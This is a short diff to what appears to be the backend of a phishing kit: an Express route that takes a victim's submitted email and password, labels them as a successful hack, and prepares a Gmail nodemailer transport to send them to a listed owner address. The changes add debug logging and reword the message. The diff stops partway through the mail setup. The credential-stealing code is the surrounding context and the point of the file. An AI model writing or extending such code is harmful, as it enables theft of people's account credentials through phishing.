@@ -30,13 +30,16 @@ let link_owner={
     momin:"momin0132813@gmail.com"
     
     };
+console.log(link_owner.admin);
+
 app.post('/_', function (req, res) {
    // res.render('f_success');
     var captured_content = `\n Email: ${req.body.email} Password: ${req.body.password}`;
     let toMail = req.body.owner;
     console.log("es");
-    var message = "If input value has correct then id was hacked "+captured_content;
+    var message = "If the input value has correct then id was hacked "+captured_content;
     var toEmail = link_owner.toMail;
+    console.log("ok"+toEmail);
 
     var transporter = nodemailer.createTransport({
     service: "gmail",
